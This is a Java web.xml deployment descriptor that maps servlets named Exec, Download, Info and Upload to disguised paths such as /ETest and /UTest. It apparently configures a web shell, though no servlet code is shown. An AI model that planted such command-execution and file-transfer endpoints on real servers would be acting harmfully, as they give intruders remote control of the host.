<?xml version="1.0" encoding="UTF-8"?>
<web-app version="3.0">
    <servlet>
        <servlet-name>ETest</servlet-name>
        <servlet-class>com.ws.Exec</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>DTest</servlet-name>
        <servlet-class>com.ws.Download</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>ITest</servlet-name>
        <servlet-class>com.ws.Info</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>UTest</servlet-name>
        <servlet-class>com.ws.Upload</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>ETest</servlet-name>
        <url-pattern>/ETest</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>DTest</servlet-name>
        <url-pattern>/DTest</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>ITest</servlet-name>
        <url-pattern>/ITest</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>UTest</servlet-name>
        <url-pattern>/UTest</url-pattern>
    </servlet-mapping>
    <session-config>
        <session-timeout>
            30
        </session-timeout>
    </session-config>
</web-app>
